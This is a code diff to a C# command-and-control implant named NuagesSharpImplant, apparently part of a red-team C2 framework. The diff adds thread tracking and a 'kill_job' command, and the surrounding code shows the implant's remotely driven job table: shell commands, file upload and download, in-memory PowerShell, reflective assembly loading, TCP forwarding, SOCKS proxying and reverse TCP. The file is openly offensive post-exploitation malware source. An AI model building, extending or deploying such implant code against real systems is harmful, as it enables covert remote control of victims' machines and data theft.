@@ -24,6 +24,7 @@ namespace NuagesSharpImplant
         private string connectionString;
         private NuagesC2Connector connector;
         private Dictionary<string, Assembly> assemblies;
+        private Dictionary<string, Thread> threads;
         String[] supportedPayloads;
         JsonArray jobs;
         private Random rnd;
@@ -55,12 +56,15 @@ namespace NuagesSharpImplant
 
             this.assemblies = new Dictionary<string, Assembly>();
 
+            this.threads = new Dictionary<string, Thread>();
+
             do_job = new Dictionary<string, Action<JsonObject>>()
               {
                   {"command", (JsonObject) => do_command(JsonObject) },
                   {"cd", (JsonObject) => do_cd(JsonObject) },
                   {"configure", (JsonObject) => do_configure(JsonObject) },
                   {"exit", (JsonObject) => do_exit(JsonObject) },
+                  {"kill_job", (JsonObject) => do_kill_job(JsonObject) },
                   {"download", (JsonObject) => do_download(JsonObject) },
                   {"upload", (JsonObject) => do_upload(JsonObject) },
                   {"posh_in_mem", (JsonObject) => do_posh_in_mem(JsonObject) },
@@ -69,7 +73,6 @@ namespace NuagesSharpImplant
                   {"tcp_fwd", (JsonObject) => do_tcp_fwd(JsonObject) },
                   {"socks", (JsonObject) => do_socks(JsonObject) },
                   {"rev_tcp", (JsonObject) => do_rev_tcp(JsonObject) }
-
               };
 
             try
@@ -104,7 +107,7 @@ namespace NuagesSharpImplant
 
             this.connectionString = connector.getConnectionString();
 
-            this.supportedPayloads = new string[] { "command", "cd", "configure", "exit", "download", "upload", "posh_in_mem", "reflected_assembly", "interactive", "tcp_fwd", "socks" };
+            this.supportedPayloads = new string[] { "command", "cd", "configure", "exit", "kill_job", "download", "upload", "posh_in_mem", "reflected_assembly", "interactive", "tcp_fwd", "socks" };
 
             this.rnd = new Random();
 
@@ -287,6 +290,15 @@ namespace NuagesSharpImplant
             SubmitJobResult(jobId, "Bye Bye!", false);
             System.Environment.Exit(0);
 
+        }
+
+        public void do_kill_job(JsonObject job)
+        {
+            string jobId = job["_id"];
+            string target_jobId = job["payload"]["options"]["job_id"];
+            this.threads[target_jobId].Abort();
+            SubmitJobResult(target_jobId, "Job Killed", true);
+            SubmitJobResult(jobId, "Job Successfully Killed", false);
         }
 
         public void do_download(JsonObject job)
@@ -756,6 +768,7 @@ namespace NuagesSharpImplant
                 Thread.Sleep(refreshrate);
             }
             this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * buffersize, result.Length - (n * buffersize)), moreData: false, error: error, n: n);
+            this.threads.Remove(jobId);
         }
 
         private JsonObject Callback(string callback, JsonObject data)
@@ -790,7 +803,8 @@ namespace NuagesSharpImplant
                     this.Heartbeat();
                     foreach (JsonValue job in this.jobs)
                     {
-                        System.Threading.Thread thread = new System.Threading.Thread(() => this.ExecuteJob((JsonObject)job));
+                        Thread thread = new Thread(() => this.ExecuteJob((JsonObject)job));
+                        this.threads[job["_id"]] = thread;
                         thread.Start();
                     }
                 }
